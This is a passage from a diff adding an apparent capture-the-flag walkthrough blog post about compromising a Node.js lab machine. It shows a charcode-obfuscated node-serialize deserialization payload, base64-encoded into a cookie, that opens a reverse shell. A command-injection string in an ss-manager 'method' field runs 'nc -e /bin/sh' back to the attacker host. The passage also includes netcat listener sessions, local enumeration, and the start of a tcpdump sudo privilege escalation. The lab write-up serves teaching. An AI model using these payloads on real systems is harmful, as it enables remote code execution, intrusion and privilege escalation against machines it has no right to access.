04,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And now it’s just a matter of encoding it with &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; and sending back with repeater. Don’t forget to set up a listener!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;GET / HTTP/1.1
+Host: 10.0.0.5:666
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOiJGcmlkYXksIDEzIE9jdCAyMDE4IDAwOjAwOjAwIEdNVCIsICJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNDgsNDYsNDgsNDYsNDgsNDYsNTIsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTEsNTEsNTUsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIn0=
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+Content-Length: 11
+ETag: W/&quot;b-GWZKb4joaEb2aqpBlbdbhMNzgtI&quot;
+Date: Wed, 11 Jul 2018 15:27:37 GMT
+Connection: close
+
+Hello Admin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We heave the connection. Great!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1337
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...
+10.0.0.5: inverse host lookup failed: Unknown host
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.5] 56006
+Connected!
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 40
+drwx------. 5 nodeadmin nodeadmin 4096 Jun  7 23:05 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x. 4 root      root      4096 Jun  2 23:02 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 nodeadmin nodeadmin    1 Jun  7 23:04 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 nodeadmin nodeadmin   18 Mar 15 09:56 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 nodeadmin nodeadmin  193 Mar 15 09:56 .bash_profile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 nodeadmin nodeadmin  231 Mar 15 09:56 .bashrc
+drwx------  3 nodeadmin nodeadmin 4096 Jun  1 13:24 .config
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 nodeadmin nodeadmin   16 Jun  3 16:41 .esd_auth
+drwxr-xr-x  4 nodeadmin nodeadmin 4096 Jun  3 00:58 .forever
+drwxrwxr-x. 3 nodeadmin nodeadmin 4096 May 30 17:44 .web
+&lt;span class=&quot;nb&quot;&gt;id 
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+which python
+/usr/bin/python
+python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/sh&quot;)'&lt;/span&gt; 
+sh-4.4&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/bash
+/bin/bash
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost .forever]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+Linux localhost.localdomain 4.16.3-301.fc28.x86_64 &lt;span class=&quot;c&quot;&gt;#1 SMP Mon Apr 23 21:59:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we’re ready to escalate. Firstly I decided to check out &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab&lt;/code&gt;. Nothing interesting there.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;crontab &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+crontab &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+@reboot /bin/node /home/nodeadmin/.web/server.js &amp;amp;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; I notice that there is another user.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+systemd-coredump:x:999:996:systemd Core Dumper:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:998:995:User &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;polkitd:/:/sbin/nologin
+geoclue:x:997:993:User &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;geoclue:/var/lib/geoclue:/sbin/nologin
+colord:x:996:992:User &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;colord:/var/lib/colord:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+gluster:x:995:989:GlusterFS daemons:/run/gluster:/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+chrony:x:994:988::/var/lib/chrony:/sbin/nologin
+dnsmasq:x:987:987:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
+openvpn:x:986:986:OpenVPN:/etc/openvpn:/sbin/nologin
+radvd:x:75:75:radvd user:/:/sbin/nologin
+saslauth:x:985:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+nm-openvpn:x:984:983:Default user &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;running openvpn spawned by NetworkManager:/:/sbin/nologin
+nm-openconnect:x:983:982:NetworkManager user &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;OpenConnect:/:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+pipewire:x:982:980:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
+gdm:x:42:42::/var/lib/gdm:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+gnome-initial-setup:x:981:979::/run/gnome-initial-setup/:/sbin/nologin
+vboxadd:x:980:1::/var/run/vboxadd:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+nginx:x:979:977:Nginx web server:/var/lib/nginx:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
+squid:x:23:23::/var/spool/squid:/sbin/nologin
+webalizer:x:67:976:Webalizer:/var/www/usage:/sbin/nologin
+nodeadmin:x:1001:1001::/home/nodeadmin:/bin/bash
+fireman:x:1002:1002::/home/fireman:/bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I decided to check whether or not we can escalate to him, looking at different files, etc. However, while viewing running processes, I’ve noticed something strange.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;fireman
+ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;fireman
+root       832  0.0  0.4 301464  4556 ?        S    04:39   0:00 su fireman &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/local/bin/ss-manager
+fireman    855  0.0  0.3  37060  3812 ?        Ss   04:39   0:00 /usr/local/bin/ss-manager
+nodeadm+   954  0.0  0.0 213788   968 pts/0    S+   04:43   0:00 &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;auto fireman&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;fireman&lt;/code&gt; is running &lt;code class=&quot;highlighter-rouge&quot;&gt;ss-manager&lt;/code&gt; as root. Googling for this service shows me this awesome exploit technique. Read more &lt;a href=&quot;https://www.exploit-db.com/exploits/43006/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Following snippet will execute a &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; reverse shell to our Kali machine.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 127.0.0.1 8839
+nc &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 127.0.0.1 8839
+add: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;server_port&quot;&lt;/span&gt;:8003, &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;|| nc -e /bin/sh 10.0.0.4 4444 ||&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+ok&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now to our listener.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 4444
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
+10.0.0.5: inverse host lookup failed: Unknown host
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.5] 51256
+python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot open directory &lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;: Permission denied
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/fireman
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/fireman
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 44
+drwx------  6 fireman fireman 4096 Jun  7 23:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x. 4 root    root    4096 Jun  2 23:02 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 fireman fireman 2151 Jun  7 22:33 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 fireman fireman   18 Mar 15 09:56 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 fireman fireman  193 Mar 15 09:56 .bash_profile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 fireman fireman  231 Mar 15 09:56 .bashrc
+drwx------  3 fireman fireman 4096 Jun  3 01:12 .config
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 fireman fireman   16 Jun  3 01:12 .esd_auth
+drwxr-xr-x  4 fireman fireman 4096 Apr 25 02:33 .mozilla
+drwxrwxr-x  2 fireman fireman 4096 Jun  3 01:55 .shadowsocks
+drwx------  2 fireman fireman 4096 Jun  2 22:39 .ssh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now as a part of my regular privilage escalation enumeration, using &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; I’ve found these 3 commands that we can run as a root.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;fireman on localhost:
+    &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;visiblepw, env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
+    LS_COLORS&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+    LC_CTYPE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
+    LC_TELEPHONE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY&quot;&lt;/span&gt;,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin
+
+User fireman may run the following commands on localhost:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/iptables
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/nmcli
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/tcpdump&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After doing a bit of research I came across this &lt;a href=&quot;http://seclists.org/tcpdump/2010/q3/68&quot;&gt;article&lt;/a&gt;, showing us how we can execute a command using a &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; tool. Firstly, I add only simple &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; command in order to check whether or not will this technique work.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/exploit
+&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/exploit
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /tmp/exploit
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /tmp/exploit
